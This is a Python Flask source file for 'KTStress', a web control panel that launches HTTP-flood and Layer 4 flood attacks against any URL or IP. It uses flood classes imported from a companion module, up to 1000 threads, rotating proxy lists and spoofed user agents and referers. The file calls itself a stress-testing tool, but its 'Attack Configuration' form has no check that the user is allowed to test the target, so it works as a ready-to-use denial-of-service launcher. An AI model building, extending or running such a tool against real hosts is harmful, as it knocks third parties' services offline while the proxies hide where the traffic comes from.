#!/usr/bin/env python3
"""
KTStress - Web-based UI for stress testing tool
"""

import os
import sys
import json
import threading
import time
import signal
from pathlib import Path
from flask import Flask, render_template_string, request, jsonify
from multiprocessing import Process

# Import the original modules
from start import Methods, ToolsConsole, handleProxyList, REQUESTS_SENT, BYTES_SEND
from start import HttpFlood, Layer4, ProxyManager, ProxyChecker, ProxyUtiles
from start import logger, bcolors, URL, gethostbyname, Path as StartPath
from start import Event, sleep, socket, AF_INET, SOCK_DGRAM
from concurrent.futures import ThreadPoolExecutor
from typing import Set, List, Any

app = Flask(__name__)
app.config['SECRET_KEY'] = 'ktstress-secret-key-2024'

# Global state
current_attack = {
    'running': False,
    'method': None,
    'target': None,
    'threads': 0,
    'duration': 0,
    'start_time': 0,
    'stop_event': None,
    'attack_threads': []
}

stats = {
    'requests_sent': 0,
    'bytes_sent': 0,
    'pps': 0,
    'bps': 0
}

HTML_TEMPLATE = '''
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>KTStress - Advanced Stress Testing Tool</title>
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        :root {
            --primary-color: #6366f1;
            --primary-dark: #4f46e5;
            --secondary-color: #8b5cf6;
            --accent-color: #06b6d4;
            --danger-color: #ef4444;
            --success-color: #10b981;
            --warning-color: #f59e0b;
            --bg-dark: #0f172a;
            --bg-card: #1e293b;
            --bg-input: #334155;
            --text-primary: #f1f5f9;
            --text-secondary: #94a3b8;
            --border-color: #475569;
            --glow-primary: 0 0 20px rgba(99, 102, 241, 0.5);
            --glow-accent: 0 0 20px rgba(6, 182, 212, 0.5);
        }

        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, var(--bg-dark) 0%, #1a1a2e 100%);
            min-height: 100vh;
            color: var(--text-primary);
            overflow-x: hidden;
        }

        body::before {
            content: '';
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: 
                radial-gradient(circle at 20% 80%, rgba(99, 102, 241, 0.15) 0%, transparent 50%),
                radial-gradient(circle at 80% 20%, rgba(139, 92, 246, 0.15) 0%, transparent 50%),
                radial-gradient(circle at 40% 40%, rgba(6, 182, 212, 0.1) 0%, transparent 40%);
            pointer-events: none;
            z-index: 0;
        }

        .container {
            max-width: 1400px;
            margin: 0 auto;
            padding: 2rem;
            position: relative;
            z-index: 1;
        }

        /* Header */
        .header {
            text-align: center;
            margin-bottom: 3rem;
            animation: fadeInDown 0.8s ease-out;
        }

        .logo {
            display: inline-flex;
            align-items: center;
            gap: 1rem;
            margin-bottom: 1rem;
        }

        .logo-icon {
            width: 60px;
            height: 60px;
            background: linear-gradient(135deg, var(--primary-color), var(--secondary-color));
            border-radius: 16px;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 1.8rem;
            box-shadow: var(--glow-primary);
            animation: pulse 2s infinite;
        }

        .logo h1 {
            font-size: 2.5rem;
            font-weight: 700;
            background: linear-gradient(135deg, var(--primary-color), var(--accent-color));
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
        }

        .tagline {
            color: var(--text-secondary);
            font-size: 1.1rem;
        }

        /* Main Grid */
        .main-grid {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 2rem;
            margin-bottom: 2rem;
        }

        @media (max-width: 1200px) {
            .main-grid {
                grid-template-columns: 1fr;
            }
        }

        /* Cards */
        .card {
            background: rgba(30, 41, 59, 0.8);
            backdrop-filter: blur(10px);
            border-radius: 20px;
            padding: 2rem;
            border: 1px solid var(--border-color);
            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3);
            animation: fadeInUp 0.8s ease-out;
            transition: transform 0.3s ease, box-shadow 0.3s ease;
        }

        .card:hover {
            transform: translateY(-5px);
            box-shadow: 0 12px 40px rgba(0, 0, 0, 0.4);
        }

        .card-header {
            display: flex;
            align-items: center;
            gap: 0.75rem;
            margin-bottom: 1.5rem;
            padding-bottom: 1rem;
            border-bottom: 1px solid var(--border-color);
        }

        .card-header i {
            font-size: 1.5rem;
            color: var(--primary-color);
        }

        .card-header h2 {
            font-size: 1.3rem;
            font-weight: 600;
        }

        /* Form Elements */
        .form-group {
            margin-bottom: 1.5rem;
        }

        .form-group label {
            display: block;
            margin-bottom: 0.5rem;
            color: var(--text-secondary);
            font-size: 0.9rem;
            font-weight: 500;
        }

        .form-control {
            width: 100%;
            padding: 0.875rem 1rem;
            background: var(--bg-input);
            border: 2px solid var(--border-color);
            border-radius: 12px;
            color: var(--text-primary);
            font-size: 1rem;
            transition: all 0.3s ease;
        }

        .form-control:focus {
            outline: none;
            border-color: var(--primary-color);
            box-shadow: 0 0 0 3px rgba(99, 102, 241, 0.2);
        }

        .form-control::placeholder {
            color: var(--text-secondary);
        }

        select.form-control {
            cursor: pointer;
            appearance: none;
            background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' fill='none' viewBox='0 0 24 24' stroke='%2394a3b8'%3E%3Cpath stroke-linecap='round' stroke-linejoin='round' stroke-width='2' d='M19 9l-7 7-7-7'%3E%3C/path%3E%3C/svg%3E");
            background-repeat: no-repeat;
            background-position: right 1rem center;
            background-size: 1rem;
            padding-right: 3rem;
        }

        .form-row {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 1rem;
        }

        /* Buttons */
        .btn {
            display: inline-flex;
            align-items: center;
            justify-content: center;
            gap: 0.5rem;
            padding: 1rem 2rem;
            border: none;
            border-radius: 12px;
            font-size: 1rem;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s ease;
            text-transform: uppercase;
            letter-spacing: 0.5px;
        }

        .btn-primary {
            background: linear-gradient(135deg, var(--primary-color), var(--primary-dark));
            color: white;
            box-shadow: 0 4px 15px rgba(99, 102, 241, 0.4);
        }

        .btn-primary:hover:not(:disabled) {
            transform: translateY(-2px);
            box-shadow: 0 6px 20px rgba(99, 102, 241, 0.5);
        }

        .btn-danger {
            background: linear-gradient(135deg, var(--danger-color), #dc2626);
            color: white;
            box-shadow: 0 4px 15px rgba(239, 68, 68, 0.4);
        }

        .btn-danger:hover:not(:disabled) {
            transform: translateY(-2px);
            box-shadow: 0 6px 20px rgba(239, 68, 68, 0.5);
        }

        .btn:disabled {
            opacity: 0.5;
            cursor: not-allowed;
        }

        .btn-block {
            width: 100%;
        }

        .btn-lg {
            padding: 1.25rem 2.5rem;
            font-size: 1.1rem;
        }

        /* Stats Grid */
        .stats-grid {
            display: grid;
            grid-template-columns: repeat(2, 1fr);
            gap: 1rem;
            margin-bottom: 1.5rem;
        }

        .stat-card {
            background: var(--bg-input);
            border-radius: 12px;
            padding: 1.25rem;
            text-align: center;
            transition: all 0.3s ease;
        }

        .stat-card:hover {
            transform: scale(1.05);
        }

        .stat-icon {
            font-size: 1.5rem;
            margin-bottom: 0.5rem;
            display: block;
        }

        .stat-value {
            font-size: 1.5rem;
            font-weight: 700;
            color: var(--primary-color);
            font-family: 'Courier New', monospace;
        }

        .stat-label {
            font-size: 0.8rem;
            color: var(--text-secondary);
            margin-top: 0.25rem;
        }

        /* Progress Bar */
        .progress-container {
            margin: 1.5rem 0;
        }

        .progress-label {
            display: flex;
            justify-content: space-between;
            margin-bottom: 0.5rem;
            font-size: 0.9rem;
            color: var(--text-secondary);
        }

        .progress-bar {
            height: 12px;
            background: var(--bg-input);
            border-radius: 6px;
            overflow: hidden;
        }

        .progress-fill {
            height: 100%;
            background: linear-gradient(90deg, var(--primary-color), var(--accent-color));
            border-radius: 6px;
            transition: width 0.3s ease;
            box-shadow: var(--glow-primary);
        }

        /* Status Badge */
        .status-badge {
            display: inline-flex;
            align-items: center;
            gap: 0.5rem;
            padding: 0.5rem 1rem;
            border-radius: 20px;
            font-size: 0.85rem;
            font-weight: 600;
        }

        .status-badge.idle {
            background: rgba(148, 163, 184, 0.2);
            color: var(--text-secondary);
        }

        .status-badge.running {
            background: rgba(16, 185, 129, 0.2);
            color: var(--success-color);
            animation: pulse-green 2s infinite;
        }

        .status-dot {
            width: 8px;
            height: 8px;
            border-radius: 50%;
            background: currentColor;
        }

        /* Logs Console */
        .console {
            background: #0d1117;
            border-radius: 12px;
            padding: 1rem;
            font-family: 'Courier New', monospace;
            font-size: 0.85rem;
            height: 200px;
            overflow-y: auto;
            border: 1px solid var(--border-color);
        }

        .console-line {
            margin-bottom: 0.25rem;
            line-height: 1.5;
        }

        .console-line.info { color: var(--accent-color); }
        .console-line.success { color: var(--success-color); }
        .console-line.warning { color: var(--warning-color); }
        .console-line.error { color: var(--danger-color); }

        /* Method Categories */
        .method-tabs {
            display: flex;
            gap: 0.5rem;
            margin-bottom: 1rem;
            flex-wrap: wrap;
        }

        .method-tab {
            padding: 0.5rem 1rem;
            background: var(--bg-input);
            border: 2px solid var(--border-color);
            border-radius: 8px;
            cursor: pointer;
            transition: all 0.3s ease;
            font-size: 0.85rem;
            font-weight: 500;
        }

        .method-tab:hover {
            border-color: var(--primary-color);
        }

        .method-tab.active {
            background: var(--primary-color);
            border-color: var(--primary-color);
            color: white;
        }

        .method-list {
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(120px, 1fr));
            gap: 0.5rem;
            max-height: 200px;
            overflow-y: auto;
            padding: 0.5rem;
            background: var(--bg-input);
            border-radius: 8px;
        }

        .method-item {
            padding: 0.5rem;
            background: var(--bg-card);
            border-radius: 6px;
            text-align: center;
            cursor: pointer;
            transition: all 0.3s ease;
            font-size: 0.85rem;
            border: 2px solid transparent;
        }

        .method-item:hover {
            background: var(--primary-color);
            transform: scale(1.05);
        }

        .method-item.selected {
            background: var(--primary-color);
            border-color: var(--accent-color);
            box-shadow: var(--glow-primary);
        }

        /* Animations */
        @keyframes fadeInDown {
            from {
                opacity: 0;
                transform: translateY(-30px);
            }
            to {
                opacity: 1;
                transform: translateY(0);
            }
        }

        @keyframes fadeInUp {
            from {
                opacity: 0;
                transform: translateY(30px);
            }
            to {
                opacity: 1;
                transform: translateY(0);
            }
        }

        @keyframes pulse {
            0%, 100% {
                box-shadow: 0 0 20px rgba(99, 102, 241, 0.5);
            }
            50% {
                box-shadow: 0 0 30px rgba(99, 102, 241, 0.8);
            }
        }

        @keyframes pulse-green {
            0%, 100% {
                box-shadow: 0 0 10px rgba(16, 185, 129, 0.3);
            }
            50% {
                box-shadow: 0 0 20px rgba(16, 185, 129, 0.6);
            }
        }

        /* Scrollbar */
        ::-webkit-scrollbar {
            width: 8px;
            height: 8px;
        }

        ::-webkit-scrollbar-track {
            background: var(--bg-dark);
        }

        ::-webkit-scrollbar-thumb {
            background: var(--border-color);
            border-radius: 4px;
        }

        ::-webkit-scrollbar-thumb:hover {
            background: var(--primary-color);
        }

        /* Responsive */
        @media (max-width: 768px) {
            .container {
                padding: 1rem;
            }

            .logo h1 {
                font-size: 1.8rem;
            }

            .form-row {
                grid-template-columns: 1fr;
            }

            .stats-grid {
                grid-template-columns: 1fr;
            }
        }

        /* Attack Info */
        .attack-info {
            background: rgba(99, 102, 241, 0.1);
            border: 1px solid rgba(99, 102, 241, 0.3);
            border-radius: 12px;
            padding: 1rem;
            margin-top: 1rem;
        }

        .attack-info-row {
            display: flex;
            justify-content: space-between;
            padding: 0.5rem 0;
            border-bottom: 1px solid rgba(99, 102, 241, 0.2);
        }

        .attack-info-row:last-child {
            border-bottom: none;
        }

        .attack-info-label {
            color: var(--text-secondary);
            font-size: 0.85rem;
        }

        .attack-info-value {
            color: var(--text-primary);
            font-weight: 600;
        }
    </style>
</head>
<body>
    <div class="container">
        <!-- Header -->
        <header class="header">
            <div class="logo">
                <div class="logo-icon">
                    <i class="fas fa-bolt"></i>
                </div>
                <h1>KTStress</h1>
            </div>
            <p class="tagline">Advanced Network Stress Testing Platform</p>
        </header>

        <!-- Main Grid -->
        <div class="main-grid">
            <!-- Configuration Card -->
            <div class="card">
                <div class="card-header">
                    <i class="fas fa-sliders-h"></i>
                    <h2>Attack Configuration</h2>
                </div>

                <form id="attackForm">
                    <div class="form-group">
                        <label for="target">Target URL / IP</label>
                        <input type="text" class="form-control" id="target" placeholder="https://example.com or 192.168.1.1" required>
                    </div>

                    <div class="form-group">
                        <label>Attack Method</label>
                        <div class="method-tabs">
                            <button type="button" class="method-tab active" data-layer="L7">Layer 7</button>
                            <button type="button" class="method-tab" data-layer="L4">Layer 4</button>
                        </div>
                        <div class="method-list" id="methodList">
                            <!-- Methods will be populated by JavaScript -->
                        </div>
                        <input type="hidden" id="selectedMethod" required>
                    </div>

                    <div class="form-row">
                        <div class="form-group">
                            <label for="threads">Threads</label>
                            <input type="number" class="form-control" id="threads" value="100" min="1" max="1000" required>
                        </div>
                        <div class="form-group">
                            <label for="duration">Duration (seconds)</label>
                            <input type="number" class="form-control" id="duration" value="60" min="1" max="3600" required>
                        </div>
                    </div>

                    <div class="form-row">
                        <div class="form-group">
                            <label for="proxyType">Proxy Type</label>
                            <select class="form-control" id="proxyType">
                                <option value="0">ALL (0)</option>
                                <option value="1">HTTP (1)</option>
                                <option value="4">SOCKS4 (4)</option>
                                <option value="5">SOCKS5 (5)</option>
                                <option value="6">RANDOM (6)</option>
                            </select>
                        </div>
                        <div class="form-group">
                            <label for="rpc">RPC (Layer 7 only)</label>
                            <input type="number" class="form-control" id="rpc" value="50" min="1" max="100">
                        </div>
                    </div>

                    <div class="form-group">
                        <label for="proxyFile">Proxy List File</label>
                        <input type="text" class="form-control" id="proxyFile" placeholder="proxies.txt" value="proxies.txt">
                    </div>

                    <div style="margin-top: 1.5rem;">
                        <button type="submit" class="btn btn-primary btn-lg btn-block" id="startBtn">
                            <i class="fas fa-play"></i>
                            Start Attack
                        </button>
                        <button type="button" class="btn btn-danger btn-lg btn-block" id="stopBtn" style="display: none; margin-top: 1rem;" disabled>
                            <i class="fas fa-stop"></i>
                            Stop Attack
                        </button>
                    </div>
                </form>
            </div>

            <!-- Statistics Card -->
            <div class="card">
                <div class="card-header">
                    <i class="fas fa-chart-line"></i>
                    <h2>Live Statistics</h2>
                    <span class="status-badge idle" id="statusBadge" style="margin-left: auto;">
                        <span class="status-dot"></span>
                        <span id="statusText">Idle</span>
                    </span>
                </div>

                <div class="stats-grid">
                    <div class="stat-card">
                        <span class="stat-icon">🚀</span>
                        <div class="stat-value" id="ppsValue">0</div>
                        <div class="stat-label">Requests/sec</div>
                    </div>
                    <div class="stat-card">
                        <span class="stat-icon">📊</span>
                        <div class="stat-value" id="bpsValue">0 B</div>
                        <div class="stat-label">Bandwidth</div>
                    </div>
                    <div class="stat-card">
                        <span class="stat-icon">🌐</span>
                        <div class="stat-value" id="totalRequests">0</div>
                        <div class="stat-label">Total Requests</div>
                    </div>
                    <div class="stat-card">
                        <span class="stat-icon">💾</span>
                        <div class="stat-value" id="totalBytes">0 B</div>
                        <div class="stat-label">Total Data</div>
                    </div>
                </div>

                <div class="progress-container">
                    <div class="progress-label">
                        <span>Progress</span>
                        <span id="progressPercent">0%</span>
                    </div>
                    <div class="progress-bar">
                        <div class="progress-fill" id="progressFill" style="width: 0%"></div>
                    </div>
                </div>

                <div class="attack-info" id="attackInfo" style="display: none;">
                    <div class="attack-info-row">
                        <span class="attack-info-label">Target</span>
                        <span class="attack-info-value" id="infoTarget">-</span>
                    </div>
                    <div class="attack-info-row">
                        <span class="attack-info-label">Method</span>
                        <span class="attack-info-value" id="infoMethod">-</span>
                    </div>
                    <div class="attack-info-row">
                        <span class="attack-info-label">Elapsed</span>
                        <span class="attack-info-value" id="infoElapsed">0s</span>
                    </div>
                    <div class="attack-info-row">
                        <span class="attack-info-label">Remaining</span>
                        <span class="attack-info-value" id="infoRemaining">0s</span>
                    </div>
                </div>

                <div class="console" id="console">
                    <div class="console-line info">[KTStress] Ready to start...</div>
                </div>
            </div>
        </div>
    </div>

    <script>
        // Methods data
        const layer7Methods = [{{ layer7_methods | tojson }}];
        const layer4Methods = [{{ layer4_methods | tojson }}];
        
        let currentLayer = 'L7';
        let selectedMethod = null;
        let statsInterval = null;
        let startTime = null;
        let totalDuration = 0;

        // DOM Elements
        const methodTabs = document.querySelectorAll('.method-tab');
        const methodList = document.getElementById('methodList');
        const selectedMethodInput = document.getElementById('selectedMethod');
        const startBtn = document.getElementById('startBtn');
        const stopBtn = document.getElementById('stopBtn');
        const statusBadge = document.getElementById('statusBadge');
        const statusText = document.getElementById('statusText');
        const consoleEl = document.getElementById('console');

        // Initialize method list
        function renderMethods(layer) {
            const methods = layer === 'L7' ? layer7Methods : layer4Methods;
            methodList.innerHTML = methods.map(m => `
                <div class="method-item" data-method="${m}">${m}</div>
            `).join('');

            // Add click handlers
            methodList.querySelectorAll('.method-item').forEach(item => {
                item.addEventListener('click', () => {
                    methodList.querySelectorAll('.method-item').forEach(i => i.classList.remove('selected'));
                    item.classList.add('selected');
                    selectedMethod = item.dataset.method;
                    selectedMethodInput.value = selectedMethod;
                    logToConsole(`Selected method: ${selectedMethod}`, 'info');
                });
            });
        }

        // Tab switching
        methodTabs.forEach(tab => {
            tab.addEventListener('click', () => {
                methodTabs.forEach(t => t.classList.remove('active'));
                tab.classList.add('active');
                currentLayer = tab.dataset.layer;
                renderMethods(currentLayer);
                selectedMethod = null;
                selectedMethodInput.value = '';
            });
        });

        // Console logging
        function logToConsole(message, type = 'info') {
            const time = new Date().toLocaleTimeString();
            const line = document.createElement('div');
            line.className = `console-line ${type}`;
            line.textContent = `[${time}] ${message}`;
            consoleEl.appendChild(line);
            consoleEl.scrollTop = consoleEl.scrollHeight;
            
            // Keep only last 100 lines
            while (consoleEl.children.length > 100) {
                consoleEl.removeChild(consoleEl.firstChild);
            }
        }

        // Format bytes
        function formatBytes(bytes) {
            if (bytes === 0) return '0 B';
            const k = 1024;
            const sizes = ['B', 'KB', 'MB', 'GB', 'TB'];
            const i = Math.floor(Math.log(bytes) / Math.log(k));
            return parseFloat((bytes / Math.pow(k, i)).toFixed(2)) + ' ' + sizes[i];
        }

        // Format number with commas
        function formatNumber(num) {
            return num.toString().replace(/\\B(?=(\\d{3})+(?!\\d))/g, ",");
        }

        // Update statistics
        async function updateStats() {
            try {
                const response = await fetch('/api/stats');
                const data = await response.json();
                
                if (data.running) {
                    document.getElementById('ppsValue').textContent = formatNumber(data.pps);
                    document.getElementById('bpsValue').textContent = formatBytes(data.bps);
                    document.getElementById('totalRequests').textContent = formatNumber(data.total_requests);
                    document.getElementById('totalBytes').textContent = formatBytes(data.total_bytes);
                    
                    // Update progress
                    if (startTime && totalDuration > 0) {
                        const elapsed = Math.floor((Date.now() - startTime) / 1000);
                        const remaining = Math.max(0, totalDuration - elapsed);
                        const percent = Math.min(100, (elapsed / totalDuration) * 100);
                        
                        document.getElementById('progressFill').style.width = percent + '%';
                        document.getElementById('progressPercent').textContent = Math.round(percent) + '%';
                        document.getElementById('infoElapsed').textContent = elapsed + 's';
                        document.getElementById('infoRemaining').textContent = remaining + 's';
                    }
                }
            } catch (error) {
                console.error('Failed to update stats:', error);
            }
        }

        // Form submission
        document.getElementById('attackForm').addEventListener('submit', async (e) => {
            e.preventDefault();
            
            if (!selectedMethod) {
                logToConsole('Please select an attack method!', 'error');
                return;
            }

            const formData = {
                target: document.getElementById('target').value,
                method: selectedMethod,
                threads: parseInt(document.getElementById('threads').value),
                duration: parseInt(document.getElementById('duration').value),
                proxy_type: parseInt(document.getElementById('proxyType').value),
                rpc: parseInt(document.getElementById('rpc').value),
                proxy_file: document.getElementById('proxyFile').value
            };

            try {
                startBtn.disabled = true;
                startBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Starting...';
                
                const response = await fetch('/api/start', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(formData)
                });
                
                const result = await response.json();
                
                if (result.success) {
                    logToConsole(`Attack started: ${formData.method} on ${formData.target}`, 'success');
                    statusBadge.className = 'status-badge running';
                    statusText.textContent = 'Running';
                    startBtn.style.display = 'none';
                    stopBtn.style.display = 'block';
                    stopBtn.disabled = false;
                    
                    document.getElementById('attackInfo').style.display = 'block';
                    document.getElementById('infoTarget').textContent = formData.target;
                    document.getElementById('infoMethod').textContent = formData.method;
                    
                    startTime = Date.now();
                    totalDuration = formData.duration;
                    
                    // Start stats polling
                    statsInterval = setInterval(updateStats, 1000);
                    updateStats();
                } else {
                    logToConsole(`Error: ${result.error}`, 'error');
                    startBtn.disabled = false;
                    startBtn.innerHTML = '<i class="fas fa-play"></i> Start Attack';
                }
            } catch (error) {
                logToConsole(`Error: ${error.message}`, 'error');
                startBtn.disabled = false;
                startBtn.innerHTML = '<i class="fas fa-play"></i> Start Attack';
            }
        });

        // Stop button
        stopBtn.addEventListener('click', async () => {
            try {
                stopBtn.disabled = true;
                stopBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Stopping...';
                
                const response = await fetch('/api/stop', { method: 'POST' });
                const result = await response.json();
                
                if (result.success) {
                    logToConsole('Attack stopped', 'warning');
                    statusBadge.className = 'status-badge idle';
                    statusText.textContent = 'Idle';
                    startBtn.style.display = 'block';
                    startBtn.disabled = false;
                    startBtn.innerHTML = '<i class="fas fa-play"></i> Start Attack';
                    stopBtn.style.display = 'none';
                    
                    clearInterval(statsInterval);
                    
                    // Reset progress
                    document.getElementById('progressFill').style.width = '0%';
                    document.getElementById('progressPercent').textContent = '0%';
                } else {
                    logToConsole(`Error stopping: ${result.error}`, 'error');
                    stopBtn.disabled = false;
                    stopBtn.innerHTML = '<i class="fas fa-stop"></i> Stop Attack';
                }
            } catch (error) {
                logToConsole(`Error: ${error.message}`, 'error');
                stopBtn.disabled = false;
                stopBtn.innerHTML = '<i class="fas fa-stop"></i> Stop Attack';
            }
        });

        // Initialize
        renderMethods('L7');
    </script>
</body>
</html>
'''

def run_attack_thread(method, target, threads, duration, proxy_type, rpc, proxy_file):
    """Run attack in a separate thread"""
    global current_attack, stats
    
    try:
        event = Event()
        event.clear()
        
        # Prepare parameters based on method type
        if method in Methods.LAYER7_METHODS:
            url = URL(target if target.startswith('http') else f'http://{target}')
            host = url.host
            
            try:
                host = gethostbyname(host)
            except:
                pass
            
            proxy_li = StartPath(__file__).parent / "files/proxies/" / proxy_file
            
            # Load user agents and referers
            useragent_li = StartPath(__file__).parent / "files/useragent.txt"
            referers_li = StartPath(__file__).parent / "files/referers.txt"
            
            uagents = set(a.strip() for a in open(useragent_li, 'r').readlines())
            referers = set(a.strip() for a in open(referers_li, 'r').readlines())
            
            # Handle proxy list
            proxies = handleProxyList(
                json.load(open(StartPath(__file__).parent / "config.json")),
                proxy_li, proxy_type, url
            )
            
            # Start HTTP flood threads
            for thread_id in range(threads):
                t = HttpFlood(
                    thread_id, url, host, method, rpc, event,
                    uagents, referers, proxies
                )
                t.start()
                current_attack['attack_threads'].append(t)
                
        elif method in Methods.LAYER4_METHODS:
            url = URL(target if target.startswith('http') else f'http://{target}')
            port = url.port or 80
            target_host = url.host
            
            try:
                target_host = gethostbyname(target_host)
            except:
                pass
            
            ref = None
            proxies = None
            
            # Start Layer 4 threads
            for _ in range(threads):
                t = Layer4(
                    (target_host, port), ref, method, event,
                    proxies, 47  # Default Minecraft protocol
                )
                t.start()
                current_attack['attack_threads'].append(t)
        
        # Wait for duration
        start_time = time.time()
        while time.time() < start_time + duration and current_attack['running']:
            sleep(1)
            # Update stats
            stats['requests_sent'] = int(REQUESTS_SENT)
            stats['bytes_sent'] = int(BYTES_SEND)
        
        # Cleanup
        event.clear()
        current_attack['running'] = False
        
    except Exception as e:
        logger.error(f"Attack error: {e}")
        current_attack['running'] = False

@app.route('/')
def index():
    return render_template_string(
        HTML_TEMPLATE,
        layer7_methods=list(Methods.LAYER7_METHODS),
        layer4_methods=list(Methods.LAYER4_METHODS)
    )

@app.route('/api/start', methods=['POST'])
def api_start():
    global current_attack, stats
    
    if current_attack['running']:
        return jsonify({'success': False, 'error': 'Attack already running'})
    
    data = request.json
    if not data:
        return jsonify({'success': False, 'error': 'No data provided'})
    
    method = data.get('method', '').upper()
    target = data.get('target', '')
    threads = data.get('threads', 100)
    duration = data.get('duration', 60)
    proxy_type = data.get('proxy_type', 0)
    rpc = data.get('rpc', 50)
    proxy_file = data.get('proxy_file', 'proxies.txt')
    
    if not method or not target:
        return jsonify({'success': False, 'error': 'Method and target are required'})
    
    if method not in Methods.ALL_METHODS:
        return jsonify({'success': False, 'error': f'Invalid method. Valid methods: {", ".join(Methods.ALL_METHODS)}'})
    
    # Reset stats
    stats = {'requests_sent': 0, 'bytes_sent': 0, 'pps': 0, 'bps': 0}
    REQUESTS_SENT.set(0)
    BYTES_SEND.set(0)
    
    # Start attack
    current_attack = {
        'running': True,
        'method': method,
        'target': target,
        'threads': threads,
        'duration': duration,
        'start_time': time.time(),
        'stop_event': Event(),
        'attack_threads': []
    }
    
    # Run attack in background thread
    attack_thread = threading.Thread(
        target=run_attack_thread,
        args=(method, target, threads, duration, proxy_type, rpc, proxy_file),
        daemon=True
    )
    attack_thread.start()
    
    return jsonify({'success': True, 'message': f'Attack started: {method} on {target}'})

@app.route('/api/stop', methods=['POST'])
def api_stop():
    global current_attack
    
    if not current_attack['running']:
        return jsonify({'success': False, 'error': 'No attack running'})
    
    current_attack['running'] = False
    
    # Clear stop event to signal threads to stop
    if current_attack['stop_event']:
        current_attack['stop_event'].clear()
    
    return jsonify({'success': True, 'message': 'Attack stopped'})

@app.route('/api/stats')
def api_stats():
    global stats, current_attack
    
    # Calculate PPS and BPS
    current_requests = int(REQUESTS_SENT)
    current_bytes = int(BYTES_SEND)
    
    pps = current_requests - stats.get('last_requests', 0)
    bps = current_bytes - stats.get('last_bytes', 0)
    
    stats['last_requests'] = current_requests
    stats['last_bytes'] = current_bytes
    stats['pps'] = pps
    stats['bps'] = bps
    
    return jsonify({
        'running': current_attack['running'],
        'method': current_attack['method'],
        'target': current_attack['target'],
        'pps': pps,
        'bps': bps,
        'total_requests': current_requests,
        'total_bytes': current_bytes,
        'elapsed': time.time() - current_attack['start_time'] if current_attack['running'] else 0
    })

if __name__ == '__main__':
    print("""
    ╔═══════════════════════════════════════════════════════════╗
    ║                                                           ║
    ║   ███╗   ██╗███████╗██╗    ██╗███████╗                   ║
    ║   ████╗  ██║██╔════╝██║    ██║██╔════╝                   ║
    ║   ██╔██╗ ██║█████╗  ██║ █╗ ██║███████╗                   ║
    ║   ██║╚██╗██║██╔══╝  ██║███╗██║╚════██║                   ║
    ║   ██║ ╚████║███████╗╚███╔███╔╝███████║                   ║
    ║   ╚═╝  ╚═══╝╚══════╝ ╚══╝╚══╝ ╚══════╝                   ║
    ║                                                           ║
    ║           Advanced Network Stress Testing Tool            ║
    ║                                                           ║
    ╚═══════════════════════════════════════════════════════════╝
    """)
    print("\n🚀 Starting KTStress Web Interface...")
    print("📡 Access the UI at: http://localhost:5000")
    print("⚠️  Press Ctrl+C to stop the server\n")
    
    app.run(host='0.0.0.0', port=5000, debug=False, threaded=True)
